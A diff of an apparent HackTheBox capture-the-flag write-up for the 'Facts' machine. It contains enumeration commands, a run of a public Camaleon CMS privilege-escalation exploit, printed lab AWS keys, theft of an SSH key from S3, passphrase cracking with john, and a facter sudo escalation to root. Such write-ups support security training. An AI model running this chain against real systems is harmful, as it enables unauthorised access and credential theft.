@@ -17,11 +17,11 @@ nmap -sC -sV -oN nmap-initial.txt facts.htb
 
 **Open Ports:**
 
-| Port      | Service | Detail                |
-| --------- | ------- | --------------------- |
-| 22/tcp    | SSH     | OpenSSH               |
-| 80/tcp    | HTTP    | nginx 1.26.3 (Ubuntu) |
-| 54321/tcp | HTTP    | S3-like service       |
+| Port | Service | Detail |
+|------|---------|--------|
+| 22/tcp | SSH | OpenSSH |
+| 80/tcp | HTTP | nginx 1.26.3 (Ubuntu) |
+| 54321/tcp | HTTP | S3-like service |
 
 The web service redirects to `http://facts.htb/`, indicating virtual host routing.
 
@@ -30,7 +30,6 @@ The web service redirects to `http://facts.htb/`, indicating virtual host routin
 ```bash
 echo "10.129.12.104 facts.htb" | sudo tee -a /etc/hosts
 ```
-
 ![Editing hosts file](screenshots/domain_host.png)
 
 ### 1.3 Web Enumeration
@@ -40,7 +39,6 @@ Using `gobuster` to brute-force directories on the web server.
 ```bash
 gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt
 ```
-
 ![Gobuster Output](screenshots/gobuster.png)
 
 Using `curl` to inspect the HTTP headers reveals the application is running **Camaleon CMS**.
@@ -48,7 +46,6 @@ Using `curl` to inspect the HTTP headers reveals the application is running **Ca
 ```bash
 curl -I http://facts.htb
 ```
-
 ![Curl Headers](screenshots/curl-camaleon.png)
 
 Navigating to `http://facts.htb/admin` reveals the Camaleon CMS admin panel.
@@ -66,7 +63,7 @@ Camaleon CMS 2.9.0 is vulnerable to an authentication bypass and privilege escal
 Register a standard user on the `/admin/register` page.
 ![CMS Registration](screenshots/facts_register.png)
 
-Run the public privilege escalation script. _(Note: The first attempt failed with user `ohaddou`, so we used user `test` instead)._
+Run the public privilege escalation script. *(Note: The first attempt failed with user `ohaddou`, so we used user `test` instead).*
 
 ```bash
 python Desktop/Facts/camaleon_cms_privilege_escalation.py -u http://facts.htb -U test -P test --newpass ohaddou -r -e
@@ -75,12 +72,11 @@ python Desktop/Facts/camaleon_cms_privilege_escalation.py -u http://facts.htb -U
 ![Running Exploit Failed](screenshots/Escal_failed.png)
 ![Running Exploit Success](screenshots/Get_keys.png)
 
-**Result:**
+**Result:** 
 The exploit successfully logs in, escalates to admin, and extracts **AWS S3 credentials**:
-
-- **Access Key:** `AKIA4F157D6E4C472E2F`
-- **Secret Key:** `Z67MkTsNZ7zkmcz1g0EBxq87CTlxG5yJu2hp6X3`
-- **Endpoint:** `http://localhost:54321` (or `facts.htb:54321`)
+*   **Access Key:** `AKIA4F157D6E4C472E2F`
+*   **Secret Key:** `Z67MkTsNZ7zkmcz1g0EBxq87CTlxG5yJu2hp6X3`
+*   **Endpoint:** `http://localhost:54321` (or `facts.htb:54321`)
 
 ![Admin Dashboard](screenshots/admin_ohaddou_pannel.png)
 
@@ -96,7 +92,6 @@ Install the AWS CLI tool and configure it using the extracted credentials.
 sudo apt install awscli
 aws configure
 ```
-
 ![AWS CLI Install](screenshots/awscli.png)
 ![AWS Configure](screenshots/aws_config.png)
 
@@ -107,7 +102,6 @@ List the S3 buckets using the custom endpoint.
 ```bash
 aws --endpoint-url http://facts.htb:54321 s3 ls
 ```
-
 ![AWS S3 List](screenshots/EP_urls.png)
 
 Two buckets are found: `internal` and `randomfacts`. Listing the `internal` bucket reveals a hidden `.ssh` directory. Download the SSH keys:
@@ -117,7 +111,6 @@ aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
 aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
 aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_keys ./authorized_keys
 ```
-
 ![AWS S3 Path](screenshots/EP_path.png)
 
 ---
@@ -126,15 +119,14 @@ aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_ke
 
 ### 4.1 Fix SSH Permissions
 
-SSH rejects private keys that are too open. Attempting to use the key with `777` permissions fails.
+By default, downloaded files often have overly permissive access. SSH strictly rejects private keys that are readable by other users. To fix this, we restrict the permissions to `600` (read/write only for the owner).
 
 ```bash
-chmod 777 id_ed25519
+chmod 600 id_ed25519
 ```
 
-![SSH Permission Error](screenshots/777.png)
-_(The fix is to restrict permissions to `600`: `chmod 600 id_ed25519`)_
-![SSH Key Unprotected](screenshots/unprotected_S_Key.png)
+*(If you try to SSH with the default permissions, you will receive an "UNPROTECTED PRIVATE KEY FILE" warning and SSH will reject the key):*
+![SSH Permission Error](screenshots/unprotected_S_Key.png)
 
 ### 4.2 Crack the Passphrase
 
@@ -145,7 +137,6 @@ ssh2john id_ed25519 > hash
 cat hash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
-
 ![Hash Generation](screenshots/hash.png)
 ![John the Ripper](screenshots/john_crack.png)
 
@@ -164,7 +155,6 @@ Once logged in, retrieve the user flag:
 ```bash
 cat ~/user.txt
 ```
-
 ![User Flag](screenshots/user.txt.png)
 
 ---
@@ -180,7 +170,6 @@ sudo -l
 ```
 
 **Output:**
-
 ```text
 Matching Defaults entries for trivia on facts:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
@@ -205,7 +194,6 @@ Facter.add(:pwn) do
 end
 EOF
 ```
-
 ![Payload Creation](screenshots/payload.rb.png)
 
 Execute `facter` as root, pointing to our custom directory:
@@ -221,7 +209,6 @@ After escalating to root via `facter`, read the root flag:
 ```bash
 cat /root/root.txt
 ```
-
 ![Root Flag](screenshots/root.txt.png)
 
 ---
